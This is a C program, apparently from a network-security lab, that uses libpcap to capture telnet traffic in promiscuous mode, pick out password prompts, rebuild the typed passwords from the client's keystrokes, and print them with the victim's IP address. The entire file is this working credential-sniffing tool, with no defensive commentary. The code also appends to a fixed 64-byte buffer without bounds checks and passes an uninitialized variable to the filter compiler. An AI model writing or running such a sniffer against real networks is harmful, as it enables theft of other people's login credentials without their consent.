#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <pcap.h>

#include "packet_headers.h"

typedef struct telnetpwd {
  unsigned long ip;
  unsigned short port;
  char pwd[64];
} telnet_pwd;

static telnet_pwd pwds[50];

void got_packet(u_char *args, const struct pcap_pkthdr *header,
	const u_char *packet)
{
  //printf("Got a packet!\n");

  struct ethernetheader *ethernet;

  ethernet = (struct ethernetheader*) packet;
  if (ntohs(ethernet->ethernet_type) == 0x0800) {
    struct ipheader *ip = (struct ipheader*) (packet + sizeof(struct ethernetheader));
    struct tcpheader *tcp;
    int data_len;
    char tcp_buff[65535];
    memset(tcp_buff, 0, 65535);
    
    printf("- Captured IP Packet from %s, ", inet_ntoa(ip->ip_srcip));
    printf("to %s, ", inet_ntoa(ip->ip_dstip));
    switch(ip->ip_proto) {
      case IPPROTO_TCP:
        tcp = (struct tcpheader*) (packet + sizeof(struct ethernetheader) + sizeof(struct ipheader));
	if (ntohs(tcp->tcp_sport) == 23 || ntohs(tcp->tcp_dport) == 23)
	  printf("protocol tcp (telnet).\n");
 	else
	  printf("protocol tcp.\n");
        //printf("port:%d\n", ntohs(tcp->tcp_sport));
        data_len = ntohs(ip->ip_len) - sizeof(struct ipheader) - sizeof(struct tcpheader);
 	if (data_len > 0) {
          int tcp_sport = ntohs(tcp->tcp_sport);
	  int tcp_dport = ntohs(tcp->tcp_dport);
 	  for (int i = 0;i < data_len; ++i) 
	    tcp_buff[i] = *((char*)tcp + sizeof(struct tcpheader) + i);
 	  if (tcp_sport == 23 && strstr(tcp_buff, "Password")) {
            for (int i = 0;i < 50; ++i) {
	      if (pwds[i].ip == 0) {
 	 	pwds[i].ip = ip->ip_dstip.s_addr;
		pwds[i].port = tcp_dport;
	        break;
              }
	    }
          } 
	  if (tcp_dport == 23) {
            if (tcp_buff[0] == '\r') {
	      for (int j = 0;j < 50; ++j) {
 	        if (pwds[j].ip == ip->ip_srcip.s_addr && pwds[j].port == tcp_sport) {
	          printf("\n* Password captured: %s, from machine %s.\n\n", pwds[j].pwd, inet_ntoa(ip->ip_srcip));
	          pwds[j].ip = 0;
	          pwds[j].port = 0;
		  memset(pwds[j].pwd, 0, 64);
	          break;
	        }
              }
	    } else {
	      for (int j = 0;j < 50; ++j) {
 	        if (pwds[j].ip == ip->ip_srcip.s_addr && pwds[j].port == tcp_sport) {
	          //printf("Password captured: %s\n", pwds[j].pwd);
		  int pwd_len = 0;
		  while ((pwds[j].pwd)[pwd_len] != '\0')
		    ++pwd_len;
		  for (int k = 0;k < data_len; ++k) 
		    (pwds[j].pwd)[pwd_len + k] = tcp_buff[k];
	          break;
	        }
              }
	    }
	  }
        }
        break;
      case IPPROTO_UDP:
        printf("protocol udp.\n");
        break;
      case IPPROTO_ICMP:
        printf("protocol icmp.\n");
        break;
      default:
        printf("protocol others.\n");
        break;
    }
  }

  return;
}

int main(int argc, char* argv[])
{
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  char filter_exp[] = "ip proto tcp and port 23";
  bpf_u_int32 net;

  for (int i = 0;i < 50;++i) 
    bzero(&pwds[i], sizeof(telnet_pwd));

  handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);
  
  pcap_compile(handle, &fp, filter_exp, 0, net);
  pcap_setfilter(handle, &fp);
  
  pcap_loop(handle, -1, got_packet, NULL);
  
  pcap_close(handle);
 
  return 0;
}
